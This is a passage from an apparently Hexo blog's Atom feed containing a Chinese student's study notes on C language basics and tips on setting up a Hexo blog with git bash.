    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>近半个月学习总结</title>
    <link href="http://example.com/2020/10/04/blog2/"/>
    <id>http://example.com/2020/10/04/blog2/</id>
    <published>2020-10-04T02:23:06.000Z</published>
    <updated>2021-01-30T14:52:49.717Z</updated>
    
    <content type="html"><![CDATA[<p>第一单元<br>1.标识符： 其主要由字母，数字以及下划线组成，它的第一个字符必须是字母或下划线。<br>2.”lf”为输出double数据时的修饰符。<br>3.多输代码，熟练scanf，printf语句(基础函数)。<br>4.printf函数输出时”c”表示输出单个字符，而”s”表示输出字符串。<br>5.使用dev c++编写用对象流实现输入输出代码时，要注意头文件应表达为<iostream>，<iomanip>且在int main()之前添加”using nemespce std”。<br>6.C语言中关键字不能用作变量名。</iomanip></iostream></p><p>7.scanf函数语句中不能对其进行格式化。如scanf（“%.3f”，&amp;a），这是错误格式。</p><p>8.注意除数！如一个数除2和除2.0得到的答案完全不同。除以2的话会当成整型变量运算，除以2.0的话则按照实型变量计算。</p><p>第二单元<br>1.”/“运算，若除数与被除数均为整数型数据，则结果也为整数型。若要保留小数，则需用以下三种格式:”1.0/1”,”1/1.0”,”1.0/1.0”。<br>2.”%”，操作数必须为整数，且运算结果答案与左侧数据符号一致。<br>3.自增自减。a.无论运算符号在整型变量的前后，运算后该整型变量的值都相同。<br>            b.运算符仅能用于整型变量，不能用于常量和表达式。<br>4.关系运算符主导的表达式的结果只有”1”,”0”两种，即计算机只判断真伪。<br>5.赋值运算符的左侧只能是变量，不能是常量和表达式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一单元&lt;br&gt;1.标识符： 其主要由字母，数字以及下划线组成，它的第一个字符必须是字母或下划线。&lt;br&gt;2.”lf”为输出double数据时的修饰符。&lt;br&gt;3.多输代码，熟练scanf，printf语句(基础函数)。&lt;br&gt;4.printf函数输出时”c”表示输出单个字</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2020/10/01/blog1/"/>
    <id>http://example.com/2020/10/01/blog1/</id>
    <published>2020-10-01T13:32:41.724Z</published>
    <updated>2020-11-11T11:09:36.789Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: “搭建的博客”<br>date: 2020-10-01 21:32:41<br>tags:<br>description:<br>1.用git bash进行hexo init指令时一定要认清楚文件夹，是对hexo文件夹进行格式化，我刚刚开始做的时候对blog文件夹一直做格式化导致耗费了很久时间<br>2.在复制个人github地址后粘贴在congig时可能会混杂许多空格，这些空格会影响你执行hexo d指令，也就是说无法将本地文件部署到个人网页上</p><p>3.生产新博客：hexo new blogx</p><p>4.写blog的时候要使用编码UTF-8,否则传输到hexo网页上会显示乱码</p><p>5.用hexo g；hexo d指令上传博客时要在**<u>hexo文件</u>**下建立的hexo bash中输入。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title: “搭建的博客”&lt;br&gt;date: 2020-10-01 21:32:41&lt;br&gt;tags:&lt;br&gt;description:&lt;br&gt;1.用git bash进行hexo init指令时一定要认清楚文件夹，是对hexo文件夹进行格式化，我刚刚开始做的时候对</summary>
      
    
    
    
    
  </entry>
  
</feed>
